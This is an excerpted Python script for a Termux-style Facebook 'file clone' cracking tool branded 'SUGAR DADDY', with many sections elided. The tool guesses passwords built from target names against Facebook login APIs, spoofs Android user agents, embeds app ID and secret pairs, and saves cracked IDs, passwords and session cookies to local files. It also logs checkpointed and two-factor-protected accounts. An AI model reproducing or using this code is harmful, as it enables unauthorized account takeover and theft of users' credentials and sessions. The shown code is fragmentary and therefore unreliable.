...
#========================#
os.system('clear')
print(f'\033[1;32m DAADY SERVER LOADING......');time.sleep(1)
#========================#
...
logo = (f"""
    ____  ___  ________  ______    _   __
   / __ )/   |/_  __/  |/  /   |  / | / /
  / __  / /| | / / / /|_/ / /| | /  |/ / 
 / /_/ / ___ |/ / / /  / / ___ |/ /|  /  
/_____/_/  |_/_/ /_/  /_/_/  |_/_/ |_/   \033[1;31m

\033[1;31m───────────────\033[1;31m𝙎𝙐𝙂𝘼𝙍 𝘿𝘼𝘿𝘿𝙔 愛\033[1;31m───────────────                                                              
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [+] AUTHOR    \033[1;91m: \033[1;92mSUGAR DADDY                ┃
 ┃ [+] TOOL      \033[1;91m: \033[1;92mFILE CLONE                 ┃
 ┃ [+] STATUS    \033[1;91m: \033[1;92mPAID                       ┃
 ┃ [+] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI \u001b[36m \033[1;37m              ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
def linex():print(47*'-')
...
def menu():
    ...
    if xd in ['1','A','a','01']:
        clear()
        print(f' {rad}[{white}={rad}] {green}PUT FILE EXAMPLE :  /sdcard/DAADY.txt')
        linex()
...
#========================#
    ...
    if xd in ['2','B','b','02']:clear();print(f"");input(f' {rad}[{white}={rad}] {green}ENTER TO BACK ');menu()
    if xd in ['3','C','c','03']:os.system('xdg-open ');menu()
    if xd in ['4','D','d','04']:os.system('xdg-open ');menu()
...
def _api_1_(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r \x1b[1;90m[{asvs}DAADY-M1\x1b[1;90m]-[{ass}%s\x1b[1;90m]-[{G}OK:%s\x1b[1;90m]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                ...
                for pw in passlist:
                        ...
                        network = random.choice(['NepalTelecome ','null','Marshmallow','Telekom China'])
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r \033[1;30m[\033[1;32mDAADY-OK\033[1;30m]\033[1;32m '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/DAADY-FILE-COOKI-M1-OK.txt','a').write(ids+' | '+pas+' | '+coki+'\n')
                                        open('/sdcard/DAADY-FILE-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print(f'\r\r \033[1;96m[DAADY-2F] '+ids+' | '+pas+'\033[1;97m')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;214m [DAADY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DAADY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/DAADY-CP.txt','a').write(ids+'|'+pas+'\n')
...
def _api_2_(ids,names,passlist):
        try:
                ...
                asvs = random.choice(["\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;86m"])
                ass = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;96m","\033[1;97m"])
                sys.stdout.write(f'\r \x1b[1;90m[{asvs}DAADY-M2\x1b[1;90m]-[{ass}%s\x1b[1;90m]-[{G}OK:%s\x1b[1;90m]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r \033[1;30m[\033[1;32mDAADY-OK\033[1;30m]\033[1;32m '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/DAADY-FILE-COOKI-M2-OK.txt','a').write(ids+' | '+pas+' | '+coki+'\n')
                                        open('/sdcard/DAADY-FILE-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
...
def _api_3_(ids,names,passlist):
        try:
                ...
                asvs = random.choice(["\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;86m"])
                ass = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;96m","\033[1;97m"])
                sys.stdout.write(f'\r \x1b[1;90m[{asvs}DAADY-M3\x1b[1;90m]-[{ass}%s\x1b[1;90m]-[{G}OK:%s\x1b[1;90m]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                       ...
                       # ua = f"[FBAN/Orca-Android;FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/Orca-Android;FBAV/120.0.0.56.124;FBPN/com.facebook.orca;FBLC/en_US;FBBV/209027753;FBCR/Jio 4G;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2239;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1412};]"
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r \033[1;30m[\033[1;32mDAADY-OK\033[1;30m]\033[1;32m '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/DAADY-FILE-COOKI-M3-OK.txt','a').write(ids+' | '+pas+' | '+coki+'\n')
                                        open('/sdcard/DAADY-FILE-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
...
def _api_4_(ids,names,passlist):
        try:
                ...
                asvs = random.choice(["\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;86m"])
                ass = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;96m","\033[1;97m"])
                sys.stdout.write(f'\r \x1b[1;90m[{asvs}DAADY-M4\x1b[1;90m]-[{ass}%s\x1b[1;90m]-[{G}OK:%s\x1b[1;90m]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                       ...
                       # ua = f"[FBAN/Orca-Android;FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/Orca-Android;FBAV/301.0.0.23.70;FBPN/com.facebook.orca;FBLC/en_US;FBBV/32429824;FBCR/I WIND;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2095;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=800,height=480};]"
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r \033[1;30m[\033[1;32mDAADY-OK\033[1;30m]\033[1;32m '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r {bDAADY}[{G}🍪{bDAADY}]\033[1;32m'+coki+'')
                                        open('/sdcard/DAADY-FILE-COOKI-M4-OK.txt','a').write(ids+' | '+pas+' | '+coki+'\n')
                                        open('/sdcard/DAADY-FILE-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
